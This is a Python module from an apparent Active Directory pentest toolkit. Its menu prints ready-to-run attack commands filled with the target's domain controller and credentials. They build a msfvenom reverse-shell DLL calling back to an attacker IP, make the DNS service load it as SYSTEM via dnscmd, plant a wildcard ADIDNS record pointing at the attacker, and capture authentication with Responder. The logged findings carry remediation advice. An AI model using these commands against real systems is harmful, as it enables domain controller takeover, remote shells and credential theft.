"""
Module: DNSAdmins / ADIDNS Abuse
Techniques: DLL injection → SYSTEM on DC, wildcard DNS record, ADIDNS manipulation
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("DNSADMINS / ADIDNS ABUSE")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  [1]  DNSAdmins DLL Injection (SYSTEM on DC)
  [2]  ADIDNS Wildcard Record (intercept all traffic)
  [3]  ADIDNS Record Add / Remove
  [4]  Check DNSAdmins membership
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        attacker = prompt("Attacker IP (SMB share hosting DLL)")
        dll_name = prompt("DLL name") or "evil.dll"
        print(f"""
  {Y}Step 1 — Generate DLL payload:{RST}
  msfvenom -p windows/x64/shell_reverse_tcp LHOST={attacker} LPORT=4444 -f dll -o {dll_name}

  {Y}Step 2 — Host on SMB share:{RST}
  impacket-smbserver share . -smb2support

  {Y}Step 3 — Set DLL (as DNSAdmins member):{RST}
  dnscmd {dc} /config /serverlevelplugindll \\\\{attacker}\\share\\{dll_name}

  {Y}Step 4 — Restart DNS service (loads DLL as SYSTEM):{RST}
  sc.exe \\\\{dc} stop dns
  sc.exe \\\\{dc} start dns

  {Y}Step 5 — CLEANUP (critical!):{RST}
  dnscmd {dc} /config /serverlevelplugindll 0
  sc.exe \\\\{dc} restart dns
""")
        add_finding("DNSAdmins DLL Injection", "Critical",
                    f"DNS service DLL hijacked on {dc} → SYSTEM",
                    "Remove non-essential users from DNSAdmins; monitor dnscmd events")

    elif c == "2":
        attacker = prompt("Attacker IP")
        print(f"""
  {Y}ADIDNS Wildcard Record (PowerShell — Powermad):{RST}
  Import-Module .\\Powermad.ps1
  Invoke-DNSUpdate -DNSType A -DNSName * -DNSData {attacker} -Verbose

  {Y}Linux — dnstool.py:{RST}
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' -a add -r '*' -d {attacker} {dc}

  {Y}Then capture with Responder:{RST}
  sudo responder -I eth0 -rdwv

  {Y}Cleanup:{RST}
  Invoke-DNSUpdate -DNSType A -DNSName * -DNSData {attacker} -Verbose -DNSDelete
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' -a remove -r '*' {dc}
""")
        add_finding("ADIDNS Wildcard Record", "High",
                    f"Wildcard DNS → {attacker} intercepts all unresolved name auth",
                    "Restrict DNS record creation; enable DNS change auditing")

    elif c == "3":
        action = prompt("Action [add/remove]") or "add"
        record = prompt("DNS record name")
        rdata  = prompt("IP to resolve to")
        print(f"""
  {Y}ADIDNS Record — {action}:{RST}

  {Y}Linux (dnstool.py):{RST}
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' -a {action} -r {record} -d {rdata} {dc}

  {Y}PowerShell (Powermad):{RST}
  Invoke-DNSUpdate -DNSType A -DNSName {record} -DNSData {rdata} -Verbose

  {Y}Enumerate current records:{RST}
  Get-DomainDNSRecord -ZoneName {dom}
  Get-DnsServerResourceRecord -ZoneName {dom} -ComputerName {dc}
""")

    elif c == "4":
        run_cmd(f"net group 'DnsAdmins' /domain")
        run_cmd(f"crackmapexec ldap {dc} -u '{user}' -p '{pw}' --groups DnsAdmins")

    pause()
